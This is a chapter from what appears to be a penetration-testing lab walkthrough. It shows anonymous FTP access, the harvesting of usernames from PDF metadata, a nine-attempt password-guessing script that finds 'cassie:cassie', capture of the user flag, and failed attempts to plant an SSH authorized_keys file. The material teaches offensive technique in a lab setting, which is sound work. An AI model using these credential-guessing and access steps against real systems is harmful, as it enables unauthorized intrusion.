# 02 — Anonymous FTP and the names in the document metadata

An anonymous FTP share is usually worth one `ls` and nothing else. Here it is the whole credential
chain: five documents, three author names, and a password rule simple enough that nine attempts
beat a wordlist.

---

## 2.1 Anonymous login

```bash
ftp -an 192.168.161.157
```

```text
Connected to 192.168.161.157.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
ftp> ls -la
229 Entering Extended Passive Mode
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Nov 02  2022 .
drwxr-xr-x    3 0        0            4096 Nov 02  2022 ..
drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
226 Directory send OK.
```

The anonymous root is empty apart from `backup`, and `backup` is owned by uid 114 / gid 120 — an
account that is not `ftp` and not `cassie`. Someone put files there on purpose.

```text
ftp> cd backup
250 Directory successfully changed.
ftp> ls
150 Here comes the directory listing.
BROCHURE-TEMPLATE.pdf
CALENDAR-TEMPLATE.pdf
FUNCTION-TEMPLATE.pdf
NEWSLETTER-TEMPLATE.pdf
REPORT-TEMPLATE.pdf
226 Directory send OK.
```

Five A4 template PDFs — report, newsletter, function, brochure, calendar. Office stationery. There is
no password file, no config, no backup archive. The interesting part is not the content; it is who
made them.

| File | Author (`dc:creator`) | Created |
|---|---|---|
| `BROCHURE-TEMPLATE.pdf` | — (stripped) | 2022-11-02 11:07:40 +02:00 |
| `REPORT-TEMPLATE.pdf` | **Robert** | 2022-11-02 11:08:26 +02:00 |
| `NEWSLETTER-TEMPLATE.pdf` | **Mark** | 2022-11-02 11:11:56 +02:00 |
| `CALENDAR-TEMPLATE.pdf` | — (stripped) | 2022-11-02 11:34:14 +02:00 |
| `FUNCTION-TEMPLATE.pdf` | **Cassie** | 2022-11-02 11:38:02 +02:00 |

Five people's copy of the same corporate template, saved inside half an hour of each other on the
same morning. That is a real document set — and it is the box's user list.

## 2.2 Pull them and read the metadata

```bash
mkdir -p charlie_ftp && cd charlie_ftp
for f in BROCHURE CALENDAR FUNCTION NEWSLETTER REPORT; do
  wget -q "ftp://192.168.161.157/backup/${f}-TEMPLATE.pdf"
done
ls
```

```text
BROCHURE-TEMPLATE.pdf    FUNCTION-TEMPLATE.pdf    REPORT-TEMPLATE.pdf
CALENDAR-TEMPLATE.pdf    NEWSLETTER-TEMPLATE.pdf
```

`pdfinfo` and `strings` show nothing useful. The fields that carry a person are the XMP ones:

```bash
exiftool -Author -Creator -CreatorTool -Producer -CreateDate -ModifyDate \
         -LastModifiedBy -Company -Title -Subject *.pdf
```

```text
======== BROCHURE-TEMPLATE.pdf
Creator Tool                    : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:07:40+02:00
Producer                        : Microsoft® Word 2016

======== CALENDAR-TEMPLATE.pdf
Creator Tool                    : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:34:14+02:00
Producer                        : Microsoft® Word 2016

======== FUNCTION-TEMPLATE.pdf
Creator                         : Cassie
Creator Tool                    : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:38:02+02:00
Producer                        : Microsoft® Word 2016

======== NEWSLETTER-TEMPLATE.pdf
Creator                         : Mark
Creator Tool                    : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:11:56+02:00
Producer                        : Microsoft® Word 2016

======== REPORT-TEMPLATE.pdf
Creator                         : Robert
Creator Tool                    : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:08:26+02:00
Producer                        : Microsoft® Word 2016
```

Three first names, no surnames, no company, no e-mail. That is enough.

> **Where to look in a document.** `dc:creator` is the XMP author. The older document-info `Author`
> tag and `LastModifiedBy` are separate fields and are often the only ones left after a "remove
> personal information" pass. Ask `exiftool` for all three before concluding a file is clean:
> `exiftool -Author -LastModifiedBy -Creator -Company -Manager *.pdf`.

## 2.3 Three names become three accounts

The obvious usernames are `robert`, `mark`, `cassie`. The non-obvious part is the password. The
range has a house style, and the hint is in how the accounts are named: single lowercase first
names. The cheapest hypothesis that fits is **the password is the username with the case flipped** —
so each name yields three candidates: `cassie`, `Cassie`, `CASSIE`.

That is 3 users × 3 passwords = **9 attempts**, not a wordlist. Which is the point: a 3420-guess
`ftp-brute` run against this box returns zero accounts, because none of the three usernames were in
the list it was given. Brute force without the names is not slow, it is aimed at nothing.

Two scripts cover both approaches:

- [`scripts/gencreds_charlie_7f3a.sh`](scripts/gencreds_charlie_7f3a.sh) — turns harvested names
  into username and password lists, including the case variants and common suffixes, if you want a
  wider net.
- [`scripts/charlie_ftp_credtest_7f3a.py`](scripts/charlie_ftp_credtest_7f3a.py) — the 9-attempt
  deterministic test used here. No guessing beyond the documented rule.

```bash
cat > names.txt <<'EOF'
Cassie
Mark
Robert
EOF

./scripts/gencreds_charlie_7f3a.sh names.txt users.txt pw.txt
```

```text
usernames: 3  -> users.txt
passwords: 33  -> pw.txt
```

## 2.4 Nine attempts

```bash
python3 scripts/charlie_ftp_credtest_7f3a.py -H 192.168.161.157
```

```text
[+] VALID  cassie:cassie
[*] pwd = /home/cassie
[*] files: local.txt
[*] dirs : -

===== local.txt =====
9c3006bdea469fa32aace984f50acc19

[*] Reuse the same pair on SSH: ssh cassie@192.168.161.157
```

First candidate, first account. `cassie:cassie` — lowercase to lowercase, the case "flipped" zero
times. The other two variants (`Cassie`, `CASSIE`) also authenticate, which is worth knowing later
when a panel is picky about which one it stores.

That is the user flag:

**`local.txt` = `9c3006bdea469fa32aace984f50acc19`**

It came over FTP, which means it did not need a shell. Good — because at this point we do not have
one.

## 2.5 FTP is read-only, so it is not a foothold

The obvious next move is to drop an `authorized_keys` into `/home/cassie/.ssh` and log in over SSH.
It does not work, and the error tells you why:

```text
ftp> mkdir .ssh
550 Permission denied.
ftp> put charlie.pub -o .ssh/authorized_keys
550 Permission denied.
ftp> quote SITE CHMOD 600 .ssh/authorized_keys
500 Unknown SITE command.
```

Every write path fails the same way — `MKD`, `STOR` and `APPE` return `550`, and `SITE CHMOD` is
not implemented at all. That combination is what a vsftpd with `write_enable=NO` looks like: the
service is configured to serve files, not accept them. Even an authenticated `cassie` cannot
upload, rename or create a directory. The FTP service is a **read primitive** and nothing else.

Useful details that fall out of this:

- A `.ssh` directory already exists with an `authorized_keys` inside it, mode `600`, owned by
  cassie. By chapter 05 that file holds a 91-byte ed25519 key that still does not get us in.
- Any file written to `/home/cassie` must be written by `cassie` through some other channel. That is
  exactly what the next chapter builds.

## 2.6 What chapter 02 produced

- Three usernames: `cassie`, `mark`, `robert`.
- One working password: `cassie:cassie` (case variants also valid).
- The user flag, read over anonymous FTP.
- A read-only FTP service — a way to *read* files as cassie, but not to write them.

Read access as `cassie` plus a panel that runs as `cassie` is a complete chain if the panel has a
command injection. The panel is Usermin 1.820.
